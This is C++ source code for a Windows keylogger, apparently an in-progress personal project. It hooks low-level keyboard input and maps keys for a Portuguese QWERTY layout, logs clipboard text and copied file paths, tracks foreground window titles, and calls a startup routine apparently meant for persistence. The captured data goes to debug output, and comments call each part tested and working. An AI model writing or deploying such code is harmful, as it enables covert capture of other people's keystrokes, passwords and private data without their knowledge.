
#include "HostInfo.h"
#include "ProcessManagement.h"
#include "StartupMethods.h"
#include <Windows.h>
#include <string>


LRESULT			CALLBACK	WindowProc(HWND, UINT, WPARAM, LPARAM);
LRESULT			CALLBACK	LowLevelKeyboardProc(int, WPARAM, LPARAM);
const wchar_t *				HandleDownKey(DWORD);
const wchar_t *				VowelModifier(const wchar_t *, const wchar_t *, bool);
void						KeyDown(const wchar_t *);
void						Clipboard_Change();
void			CALLBACK	WinEventProc(HWINEVENTHOOK, DWORD, HWND, LONG, LONG, DWORD, DWORD);
const			wchar_t *	GetWindowTitle(HWND);



//TODO: Hooks working, now look up on the other features of the KL and implement them separately
//TODO: Only join them together when all the features are complete

int WINAPI wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPWSTR lpCmdLine,int cmdShow) {
	SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, GetModuleHandleW(NULL), 0);

	static const LPCWSTR class_name = L"DUMMY_CLASS";
	WNDCLASSEX wx = {};
	wx.cbSize = sizeof(WNDCLASSEX);
	wx.lpfnWndProc = WindowProc;        // function which will handle messages
	wx.hInstance = GetModuleHandleW(NULL);
	wx.lpszClassName = class_name;

	HWND hwnd;

	if (RegisterClassExW(&wx)) {	
		hwnd = CreateWindowExW(0, class_name, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);
	}

	if (AddClipboardFormatListener(hwnd)) {		
		OutputDebugStringW(L"AddClipboardFormatListener SUCCESS\n");
	}

	HWINEVENTHOOK hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	//EVENT_OBJECT_NAMECHANGE fires too many times for the required job, but there's no other option
	HWINEVENTHOOK hook2 = SetWinEventHook(EVENT_OBJECT_NAMECHANGE, EVENT_OBJECT_NAMECHANGE, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);


	StartupMethods::ChangeAppPath();
	return 0;

	MSG msg;

	while (GetMessageW(&msg, NULL, 0, 0) != 0) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	
	return 0;
}




//Window Changed hook tested and working

wchar_t lastText[500];

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
	//Creating a temp variable because wcscmp() can't take NULL pointers
	//And GetWindowTitle can return NULL

	const wchar_t * temp = GetWindowTitle(GetForegroundWindow());
	
	if (temp == NULL) return; 

	if (wcscmp(lastText, temp) == 0) { //lastText and temp are equal
		delete[] temp;
		return;
	}

	memcpy(lastText, temp, sizeof(lastText));
	
	OutputDebugStringW(L"Title Changed\n");

	OutputDebugStringW(lastText);
	OutputDebugStringW(L"\n");
	delete[] temp;
}

const wchar_t * GetWindowTitle(HWND hwnd) {
	wchar_t * text = new wchar_t[500];

	if (!GetWindowTextW(hwnd, text, 500)) {
		delete[] text;
		return NULL;
	}

	return text;
}




//Clipboard logger tested and working

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_CLIPBOARDUPDATE:
		Clipboard_Change();
		return 0;
	}
	return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

void Clipboard_Change()
{
	//This code doesn't work if recycle bin is put on clipboard among other files
	//Don't know why, explorer seems to handle it somehow, can't be bothered to search
	//Not much use copying the recycle bin anyway

	if (!OpenClipboard(NULL)) {
		OutputDebugStringW(L"OpenClipboard Error\n");
		return;
	}

	HGLOBAL hglobal;
	if (IsClipboardFormatAvailable(CF_TEXT)) {
		hglobal = GetClipboardData(CF_TEXT);

		size_t requiredSize = 0;

		if (hglobal == NULL) {
			OutputDebugStringW(L"hglobal is NULL - CF_TEXT \n");
			CloseClipboard();
			return;
		}

		const char * cbText = static_cast<char *> (GlobalLock(hglobal)); //casts LPVOID to char *

		//code below converts char * to wchar_t * to use in OutputDebugStringW()

		mbstowcs_s(&requiredSize, NULL, 0, cbText, 0); //gets the buffer size required

		wchar_t * buffer = new wchar_t[requiredSize + 1]();
		mbstowcs_s(&requiredSize, buffer, requiredSize + 1, cbText, requiredSize); //converts the 'cbText' char * to 'buf' wchar_t *

		OutputDebugStringW(buffer);

		delete[] buffer;
	}
	else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
		hglobal = GetClipboardData(CF_UNICODETEXT);

		if (hglobal == NULL) {
			OutputDebugStringW(L"hglobal is NULL - CF_UNICODETEXT\n");
			CloseClipboard();
			return;
		}

		const wchar_t * cbText = static_cast<wchar_t*> (GlobalLock(hglobal)); //casts LPVOID to wchar_t *
		OutputDebugStringW(cbText);
	}
	else if (IsClipboardFormatAvailable(CF_HDROP)) {
		hglobal = GetClipboardData(CF_HDROP);

		if (hglobal == NULL) {
			OutputDebugStringW(L"hglobal is NULL - CF_HDROP\n");
			CloseClipboard();
			return;
		}

		HDROP fList = static_cast<HDROP> (GlobalLock(hglobal));
		UINT numberOfFiles = DragQueryFileW(fList, 0xFFFFFFFF, NULL, 0); //Checks if there's files in fList returned in GetClipboardData, returns non-zero if yes
		
		if (numberOfFiles) { 
			for (UINT i = 0; i < numberOfFiles; i++)
			{
				wchar_t buffer[MAX_PATH] = {0};

				DragQueryFileW(fList, i, buffer, MAX_PATH);
				OutputDebugStringW(buffer);
				OutputDebugStringW(L"\n");
			}
		}
	}
	else {
		CloseClipboard();
		return;
	}

	GlobalUnlock(hglobal);
	CloseClipboard();
}




//Keylogger fully tested and working (PT QWERTY keyboard)

const wchar_t * _modifier = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == 0) {					//code 0 means that it's a keyboard message
		switch (wParam) {
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*) lParam; //cast lParam to KBDLLHOOKSTRUCT to use it's members
			
			KeyDown(HandleDownKey(p->vkCode));
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

const wchar_t * HandleDownKey(DWORD keyCode) {
	//keys ordered below by their value (ascending, except vowels)

	//http://stackoverflow.com/a/5302628/2990244
	SHORT stateShift = GetKeyState(VK_SHIFT);
	bool shift = stateShift < 0; //equals true if shift is pressed

	SHORT stateCapital = GetKeyState(VK_CAPITAL);
	bool upper = (stateCapital & 1) != 0; //equals true if caps is on

	//checks if uppercase
	if (upper) {
		upper = !shift; //if caps is on then shift inverts the caps value
	}
	else {
		upper = shift; //since caps is off, uppercase depends only on shift
	}

	switch (keyCode) {

		//special keys
	case VK_BACK:return L"<Back>";
	case VK_TAB:return L"<Tab>";
	case VK_RETURN:return L"\n";
		//case VK_SHIFT:return L"<Shift>";
		//case VK_CONTROL:return L"<Control>";
	case VK_MENU:return L"<Alt>";
	case VK_PAUSE:return L"<Pause>";
		//case VK_CAPITAL:return L"<Capital>";
	case VK_ESCAPE:return L"<Esc>";
	case VK_SPACE:return L" ";
	case VK_PRIOR:return L"<PageUp>";
	case VK_NEXT:return L"<PageDown>";
		/*case VK_END:return L"<End>";
		case VK_HOME:return L"<Home>";
		case VK_LEFT:return L"<Left>";
		case VK_UP:return L"<Up>";
		case VK_RIGHT:return L"<Right>";
		case VK_DOWN:return L"<Down>";
		case VK_SELECT:return L"<Select>";*/
	case VK_SNAPSHOT:return L"<Print>";
	case VK_INSERT:return L"<Insert>";
	case VK_DELETE:return L"<Delete>";

		//number keys
	case 0x30:return shift ? L"=" : L"0";
	case 0x31:return shift ? L"!" : L"1";
	case 0x32:return shift ? L"\"" : L"2";
	case 0x33:return shift ? L"#" : L"3";
	case 0x34:return shift ? L"$" : L"4";
	case 0x35:return shift ? L"%" : L"5";
	case 0x36:return shift ? L"&" : L"6";
	case 0x37:return shift ? L"/" : L"7";
	case 0x38:return shift ? L"(" : L"8";
	case 0x39:return shift ? L")" : L"9";

		//vowels, separated to check for modifiers.

	case 0x41:return VowelModifier(_modifier, L"a", upper);
	case 0x45:return VowelModifier(_modifier, L"e", upper);
	case 0x49:return VowelModifier(_modifier, L"i", upper);
	case 0x4F:return VowelModifier(_modifier, L"o", upper);
	case 0x55:return VowelModifier(_modifier, L"u", upper);

		//character keys
	case 0x42:return upper ? L"B" : L"b";
	case 0x43:return upper ? L"C" : L"c";
	case 0x44:return upper ? L"D" : L"d";
	case 0x46:return upper ? L"F" : L"f";
	case 0x47:return upper ? L"G" : L"g";
	case 0x48:return upper ? L"H" : L"h";
	case 0x4A:return upper ? L"J" : L"j";
	case 0x4B:return upper ? L"K" : L"k";
	case 0x4C:return upper ? L"L" : L"l";
	case 0x4D:return upper ? L"M" : L"m";
	case 0x4E:return upper ? L"N" : L"n";
	case 0x50:return upper ? L"P" : L"p";
	case 0x51:return upper ? L"Q" : L"q";
	case 0x52:return upper ? L"R" : L"r";
	case 0x53:return upper ? L"S" : L"s";
	case 0x54:return upper ? L"T" : L"t";
	case 0x56:return upper ? L"V" : L"v";
	case 0x57:return upper ? L"W" : L"w";
	case 0x58:return upper ? L"X" : L"x";
	case 0x59:return upper ? L"Y" : L"y";
	case 0x5A:return upper ? L"Z" : L"z";


		//more special keys
	case VK_LWIN:return L"<LWin>";
	case VK_RWIN:return L"<RWin>";
	case VK_APPS:return L"<Apps>";
	case VK_SLEEP:return L"<Sleep>";

		//numpad keys
	case VK_NUMPAD0:return L"0";
	case VK_NUMPAD1:return L"1";
	case VK_NUMPAD2:return L"2";
	case VK_NUMPAD3:return L"3";
	case VK_NUMPAD4:return L"4";
	case VK_NUMPAD5:return L"5";
	case VK_NUMPAD6:return L"6";
	case VK_NUMPAD7:return L"7";
	case VK_NUMPAD8:return L"8";
	case VK_NUMPAD9:return L"9";

		//numpad math keys
	case VK_MULTIPLY:return L"*";
	case VK_ADD:return L"+";
	case VK_SUBTRACT:return L"-";
	case VK_DECIMAL:return L".";
	case VK_DIVIDE:return L"/";

		//F keys
	case VK_F1:return L"<F1>";
	case VK_F2:return L"<F2>";
	case VK_F3:return L"<F3>";
	case VK_F4:return L"<F4>";
	case VK_F5:return L"<F5>";
	case VK_F6:return L"<F6>";
	case VK_F7:return L"<F7>";
	case VK_F8:return L"<F8>";
	case VK_F9:return L"<F9>";
	case VK_F10:return L"<F10>";
	case VK_F11:return L"<F11>";
	case VK_F12:return L"<F12>";

		//more special keys
	case VK_NUMLOCK:return L"<NumLock>";
		/*case VK_LSHIFT:return L"<LShift>";
		case VK_RSHIFT:return L"<RShift>";
		case VK_LCONTROL:return L"<LCtrl>";
		case VK_RCONTROL:return L"<RCtrl>";*/
	case VK_LMENU:return L"<LMenu>";
	case VK_RMENU:return L"<RMenu>";

		//Math keys
	case VK_OEM_PLUS:return shift ? L"*" : L"+";
	case VK_OEM_COMMA:return shift ? L";" : L",";
	case VK_OEM_MINUS:return shift ? L"_" : L"-";
	case VK_OEM_PERIOD:return shift ? L":" : L".";

		//Modifier keys
	case VK_OEM_1:
		if (_modifier == NULL) {
			_modifier = shift ? L"`" : L"´";
			return NULL;
		}
		else {
			return shift ? L"`" : L"´";
		}
	case VK_OEM_2:
		if (_modifier == NULL) {
			_modifier = shift ? L"^" : L"~";
			return NULL;
		}
		else {
			return shift ? L"^" : L"~";
		}

		//Miscellaneous
	case VK_OEM_3:return upper ? L"Ç" : L"ç";
	case VK_OEM_4:return shift ? L"?" : L"'";
	case VK_OEM_5:return shift ? L"|" : L"\\";
	case VK_OEM_6:return shift ? L"»" : L"«";
	case VK_OEM_7:return shift ? L"ª" : L"º";
	case VK_OEM_102:return shift ? L">" : L"<";
	}

	return NULL;
}

const wchar_t * VowelModifier(const wchar_t * modifier, const wchar_t * key, bool upper) {
	_modifier = NULL;

	if (modifier == NULL) {
		if (key == L"a") {
			return upper ? L"A" : key;
		}
		if (key == L"e") {
			return upper ? L"E" : key;
		}
		if (key == L"i") {
			return upper ? L"I" : key;
		}
		if (key == L"o") {
			return upper ? L"O" : key;
		}
		if (key == L"u") {
			return upper ? L"U" : key;
		}
	}

	if (modifier == L"´") {
		if (key == L"a") {
			return upper ? L"Á" : L"á";
		}
		else if (key == L"e") {
			return upper ? L"É" : L"é";
		}
		else if (key == L"i") {
			return upper ? L"Í" : L"í";
		}
		else if (key == L"o") {
			return upper ? L"Ó" : L"ó";
		}
		else if (key == L"u") {
			return upper ? L"Ú" : L"ú";
		}
	}
	else if (modifier == L"`") {
		if (key == L"a") {
			return upper ? L"À" : L"à";
		}
		else if (key == L"e") {
			return upper ? L"È" : L"è";
		}
		else if (key == L"i") {
			return upper ? L"Ì" : L"ì";
		}
		else if (key == L"o") {
			return upper ? L"Ò" : L"ò";
		}
		else if (key == L"u") {
			return upper ? L"Ù" : L"ù";
		}
	}
	else if (modifier == L"~") {
		if (key == L"a") {
			return upper ? L"Ã" : L"ã";
		}
		else if (key == L"e") {
			return upper ? L"~E" : L"~e";
		}
		else if (key == L"i") {
			return upper ? L"~I" : L"~i";
		}
		else if (key == L"o") {
			return upper ? L"Õ" : L"õ";
		}
		else if (key == L"u") {
			return upper ? L"~U" : L"~u";
		}
	}
	else if (modifier == L"^") {
		if (key == L"a") {
			return upper ? L"Â" : L"â";
		}
		else if (key == L"e") {
			return upper ? L"Ê" : L"ê";
		}
		else if (key == L"i") {
			return upper ? L"Î" : L"î";
		}
		else if (key == L"o") {
			return upper ? L"Ô" : L"ô";
		}
		else if (key == L"u") {
			return upper ? L"Û" : L"û";
		}
	}

	return NULL; //Shouldn't happen, but to suppress the C4715 warning
}

void KeyDown(const wchar_t * key) {
	if (key == NULL) return;

	if (_modifier == NULL) {
		OutputDebugStringW(key);
	}
	else {
		std::wstring a(_modifier);
		std::wstring b(a + key);
		OutputDebugStringW(b.c_str());
		_modifier = NULL;
	}
}




//high res clock
/*std::chrono::high_resolution_clock::time_point t1 = std::chrono::high_resolution_clock::now();
std::chrono::high_resolution_clock::time_point t2 = std::chrono::high_resolution_clock::now();
auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1).count();

std::wstringstream ss;
ss << duration;
OutputDebugStringW(ss.str().c_str());*/